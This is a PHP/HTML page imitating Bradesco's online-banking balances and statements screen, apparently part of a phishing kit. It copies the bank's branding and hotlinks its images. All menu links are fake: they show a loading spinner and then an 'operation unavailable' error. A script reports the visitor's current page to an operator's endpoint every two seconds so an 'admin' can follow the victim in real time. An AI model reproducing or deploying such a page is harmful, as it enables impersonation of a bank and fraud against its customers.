<?php
session_start();
if (!isset($_SESSION['client_id'])) { header('Location: /index.php'); exit; }

$menuAtivo = 'saldos';

?>
<!DOCTYPE html>
<html lang="pt-br">
<head>
<meta charset="UTF-8">
<title>Banco Bradesco | Entre Nós, Você Vem Primeiro</title>
<link rel="icon" href="/imagens/iconsite.png" type="image/png"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link href="https://fonts.googleapis.com/css2?family=Arial:wght@400;700&display=swap" rel="stylesheet">
<style>
    /* --- ESTILOS GERAIS --- */
    body {
        font-family: Arial, sans-serif;
        font-size: 0.81em;
        color: #333;
        background-color: #f0f2f5;
    }
    .page-wrapper {
        display: flex;
        justify-content: center;
        padding: 20px;
    }
    .content-container {
        width: 100%;
        max-width: 752px;
    }

    /* --- CABEÇALHO SUPERIOR (FORA DO CARD) --- */
    .page-header-bar {
        background-color: #f0f0f0;
        padding: 8px 15px;
        border: 1px solid #ccc;
        border-bottom: none;
        border-radius: 4px 4px 0 0;
        font-size: 1em;
        color: #333;
        font-weight: bold;
    }
    .page-header-bar::before {
        content: '›';
        margin-right: 8px;
    }

    /* --- CARD DE CONTEÚDO --- */
    .content-card {
        background: #FFF url(https://www.ib13.bradesco.com.br/ibpf/imagens/geral/pix_fill.gif) left bottom repeat-x;
        border: 1px solid #ccc;
        padding: 15px 20px 40px;
        position: relative;
        border-radius: 0 0 4px 4px;
    }

    /* --- CABEÇALHO INTERNO DO CARD --- */
    .content-header {
        display: flex;
        justify-content: space-between;
        align-items: flex-start;
        margin-bottom: 20px;
        padding-bottom: 15px;
        border-bottom: 1px solid #eee;
    }
    .content-header h1 {
        font-size: 1.8em;
        font-weight: normal;
        color: #000;
        margin: 0;
    }
    .content-header h1 sup {
        font-size: 0.6em;
        font-weight: bold;
        vertical-align: super;
        margin-left: 2px;
    }
    .header-options {
        display: flex;
        flex-direction: column;
        gap: 8px;
        font-size: 0.9em;
    }
    .header-options a {
        display: flex;
        align-items: center;
        gap: 5px;
        color: #666;
        text-decoration: none;
    }
    .header-options a:hover { text-decoration: underline; }
    .header-options img { width: 16px; height: 16px; }

    /* --- CORPO E MENUS --- */
    .content-body {
        display: grid;
        grid-template-columns: 1.2fr 1fr;
        gap: 40px;
    }
    .menu-group { margin-bottom: 25px; }
    .menu-group h2 {
        font-size: 1em;
        font-weight: bold;
        margin: 0 0 10px 0;
        color: #333;
        text-transform: uppercase;
        padding-bottom: 5px;
        border-bottom: 1px solid #ddd;
        margin-bottom: 15px;
    }
    .menu-group ul { margin: 0; padding: 0; list-style: none; }
    .menu-group li { 
        margin-bottom: 6px; 
        padding-bottom: 6px; 
        border-bottom: 1px dotted #e0e0e0; 
    }
    .menu-group li:last-child { border-bottom: none; }
    .menu-link {
        color: #333;
        text-decoration: none;
        font-size: 1em;
        display: block;
        padding: 3px 0;
    }
    .menu-link:hover { color: #142463; text-decoration: none; }
    .menu-link::before { content: '›'; margin-right: 5px; color: #142463; }
    .menu-link.sub-item::before { content: '•'; color: #707070; vertical-align: middle; margin-left: 5px; margin-right: 8px; }
    .menu-link.sub-item { padding-left: 18px; }

    /* --- COMPONENTES DE FEEDBACK (SPINNER E POPUP) --- */
    .processing-overlay{position:absolute;inset:0;background:rgba(255,255,255,0.95);display:none;align-items:center;justify-content:center;flex-direction:column;z-index:10;border-radius:5px;}
    .processing-overlay .spinner{width:30px;height:30px;border:3px solid #f3f3f3;border-top-color:#142463;border-radius:50%;animation:spin .8s linear infinite;margin-bottom:10px;}
    @keyframes spin{to{transform:rotate(360deg);}}
    .processing-overlay p{margin:0;font-weight:bold;color:#333;font-size:0.9em;}
    .popup-erro{position:fixed;inset:0;background:rgba(0,0,0,.4);display:none;align-items:center;justify-content:center;z-index:200;padding:20px;}
    .popup-erro .box{background:#fff;border-radius:10px;padding:20px 25px;max-width:350px;width:100%;box-shadow:0 5px 15px -3px rgba(0,0,0,.3);text-align:center;animation:pop .3s ease;}
    @keyframes pop{from{transform:scale(.9);opacity:.2;}to{transform:scale(1);opacity:1;}}
    .popup-erro h4{margin:0 0 10px;font-size:1.1em;font-weight:bold;color:#034694;}
    .popup-erro p{margin:0 0 15px;font-size:0.9em;line-height:1.4;}
    .popup-erro button{background:linear-gradient(70deg, #142463, #034694 100%);border:none;color:#fff;padding:8px 20px;font-size:0.9em;font-weight:bold;border-radius:20px;cursor:pointer;}


    /* =========================================================
       RESPONSIVIDADE (MEDIA QUERIES)
       ========================================================= */
    
    /* Para tablets e celulares (abaixo de 768px) */
    @media (max-width: 768px) {
        .page-wrapper {
            padding: 10px;
            padding-top: 70px; /* Mantém o espaçamento do topo */
        }

        .content-body {
            /* Transforma o grid de 2 colunas em 1 coluna */
            grid-template-columns: 1fr;
            gap: 30px; /* Reduz o espaçamento entre as seções */
        }

        .content-header {
            /* Empilha o título e as opções */
            flex-direction: column;
            align-items: flex-start; /* Alinha tudo à esquerda */
            gap: 15px;
        }

        .content-header h1 {
            font-size: 1.6em; /* Levemente menor para caber melhor */
        }
    }
</style>
</head>
<body>

<?php include 'headerexclusive.php'; ?>
<?php include 'menuexclusive.php'; ?>

<div class="page-wrapper">
    <div class="content-container">
        <div class="page-header-bar">Saldos e Extratos</div>
        
        <div class="content-card">
            <div id="processing-overlay" class="processing-overlay">
                <div class="spinner"></div>
                <p>Carregando...</p>
            </div>

            <header class="content-header">
                <h1>Saldo e Extratos<sup>5</sup></h1>
                <div class="header-options">
                    <a href="#" class="menu-link">
                        <img src="https://www.ib13.bradesco.com.br/ibpf/imagens/geral/ico_funcoes.gif" alt="Ícone de comprovantes">
                        Comprovantes (2ª Via)
                    </a>
                    <a href="#" class="menu-link">
                        <img src="https://www.ib13.bradesco.com.br/ibpf/imagens/geral/ico_minha_pasta_digital.jpg" alt="Ícone de pasta digital">
                        Minha Pasta Digital
                    </a>
                </div>
            </header>

            <main class="content-body">
                <div class="left-column">
                    <div class="menu-group">
                        <h2>CONTA-CORRENTE</h2>
                        <ul>
                           <li><a href="#" class="menu-link">Saldo</a></li>
                           <li><a href="#" class="menu-link">Extrato (Últimos Lançamentos)</a></li>
                           <li><a href="#" class="menu-link">Extrato Mensal / Por Período</a></li>
                           <li><a href="#" class="menu-link">Extrato de Cheques</a></li>
                           <li><a href="#" class="menu-link">Extrato de TED</a></li>
                           <li><a href="#" class="menu-link">Lançamentos Futuros</a></li>
                           <li><a href="#" class="menu-link">Extrato de Cheque Especial</a></li>
                        </ul>
                    </div>
                    <div class="menu-group">
                        <h2>CONTA-POUPANÇA</h2>
                        <ul>
                           <li><a href="#" class="menu-link">Saldo</a></li>
                           <li><a href="#" class="menu-link">Extrato (Últimos Lançamentos)</a></li>
                           <li><a href="#" class="menu-link">Extrato Mensal / Por Período</a></li>
                           <li><a href="#" class="menu-link">Extrato de Cheques</a></li>
                           <li><a href="#" class="menu-link">Extrato de TED</a></li>
                           <li><a href="#" class="menu-link">Lançamentos Futuros</a></li>
                           <li><a href="#" class="menu-link">Extrato de Cheque Especial</a></li>
                        </ul>
                    </div>
                    <div class="menu-group">
                        <h2>CONTA DE INVESTIMENTO</h2>
                        <ul>
                            <li><a href="#" class="menu-link">Extrato (Últimos Lançamentos)</a></li>
                        </ul>
                    </div>
                </div>
    
                <div class="right-column">
                    <div class="menu-group">
                        <h2>OUTRAS OPÇÕES</h2>
                        <ul>
                            <li><a href="#" class="menu-link">Extrato de Utilização de Serviços</a></li>
                            <li><a href="#" class="menu-link">Cancelar Recebimento de Extrato Unificado</a></li>
                            <li><a href="#" class="menu-link">Extrato Anual de Tarifas</a></li>
                            <li><a href="#" class="menu-link">Extrato Anual de Operações de Crédito</a></li>
                            <li><a href="#" class="menu-link">Adicionar Outras Contas Bradesco para Consulta (mesmo CPF)</a></li>
                        </ul>
                    </div>
                    <div class="menu-group">
                        <h2>EXTRATO UNIFICADO</h2>
                        <ul>
                            <li><a href="#" class="menu-link">Visualizar Extrato Digital</a></li>
                            <li><a href="#" class="menu-link">Aderir (Extrato Digital / Correio)</a></li>
                            <li><a href="#" class="menu-link">Cancelar Extrato</a></li>
                        </ul>
                    </div>
                    <div class="menu-group">
                        <h2>EMPRÉSTIMOS</h2>
                        <ul>
                            <li><a href="#" class="menu-link">Extrato de Empréstimo Contratado</a></li>
                        </ul>
                    </div>
                     <div class="menu-group">
                        <h2>INVESTIMENTOS</h2>
                        <ul>
                            <li><a href="#" class="menu-link sub-item">Fundos</a></li>
                            <li><a href="#" class="menu-link">Extrato de Movimentação</a></li>
                        </ul>
                    </div>
                </div>
            </main>
        </div>
    </div>
</div>

<div id="popupErro" class="popup-erro">
    <div class="box">
        <h4>Operação Indisponível</h4>
        <p>Não foi possível processar sua solicitação no momento.<br> Por favor, tente novamente mais tarde.</p>
        <button id="btnFecharPopup">Tentar novamente</button>
    </div>
</div>

<?php include 'footerexclusive.php'; ?>
<?php include 'chat.php'; ?>

<script>
document.addEventListener('DOMContentLoaded', () => {
    const contentCard = document.querySelector('.content-card');
    const overlay = document.getElementById('processing-overlay');
    const popupErro = document.getElementById('popupErro');
    const btnFecharPopup = document.getElementById('btnFecharPopup');

    contentCard.addEventListener('click', (event) => {
        const linkClicado = event.target.closest('.menu-link');

        if (linkClicado) {
            event.preventDefault();
            overlay.style.display = 'flex';
            setTimeout(() => {
                overlay.style.display = 'none';
                popupErro.style.display = 'flex';
            }, 5000);
        }
    });

    btnFecharPopup.addEventListener('click', () => {
        popupErro.style.display = 'none';
    });
});
</script>

<script>
    document.addEventListener('DOMContentLoaded', () => {
        // 1. Defina o nome da página (continua igual)
        // IMPORTANTE: Altere este valor para o nome da página atual
        const pageName = 'saldos.php'; 

        // 2. Crie uma função para encapsular a lógica do fetch
        // Isso torna o código mais limpo e reutilizável.
        function reportarEstagioAtual() {
            fetch('/atualizar_estagio.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ estagio: pageName }),
                credentials: 'include' // É uma boa prática manter isso
            }).catch(error => console.error(`Erro ao reportar estágio '${pageName}':`, error));
        }

        // 3. Chame a função uma vez imediatamente quando a página carregar
        // Para que o admin veja a atualização na hora, sem esperar 2 segundos.
        reportarEstagioAtual(); 

        // 4. Configure para chamar a função repetidamente a cada 2 segundos
        setInterval(reportarEstagioAtual, 2000); // 2000 milissegundos = 2 segundos
    });
    </script>

</body>
</html>